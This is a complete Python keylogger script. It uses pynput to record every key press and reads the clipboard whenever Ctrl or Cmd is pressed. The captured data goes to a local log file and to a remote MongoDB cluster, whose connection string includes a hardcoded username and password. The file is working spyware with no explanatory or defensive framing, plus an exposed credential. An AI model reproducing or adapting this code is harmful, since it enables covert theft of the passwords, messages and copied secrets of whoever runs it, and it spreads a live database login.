from pynput.keyboard import Key, Listener
import logging
from pymongo import MongoClient
import json
import os
import pyperclip


mongo_client = MongoClient("mongodb+srv://kgrcet:kgrcet123@cluster0.9ruwq.mongodb.net/")  
db = mongo_client["keylogger_db"]
collection = db["logs_kgrcet"]  

log_dir = os.getcwd()
log_file = os.path.join(log_dir, "keyLog.txt")


if not os.path.exists(log_dir):
    os.makedirs(log_dir)

logging.basicConfig(
    filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s"
)


def log_to_mongo(log_entry):
    try:
        collection.insert_one(log_entry)
    except Exception as e:
        print(f"Error saving log to MongoDB: {e}")


def on_press(key):
    log_entry = {"key": str(key), "type": "key_press"}
    
    log_to_mongo(log_entry)
    logging.info(str(key))
    
    if key == Key.ctrl_l or key == Key.cmd:
        clipboard_content = pyperclip.paste()
        log_entry = {"clipboard": clipboard_content, "type": "clipboard"}

        log_to_mongo(log_entry)
        logging.info(f"Clipboard copied: {clipboard_content}")



# Set up listener to capture keystrokes
with Listener(on_press=on_press) as listener:
    listener.join()
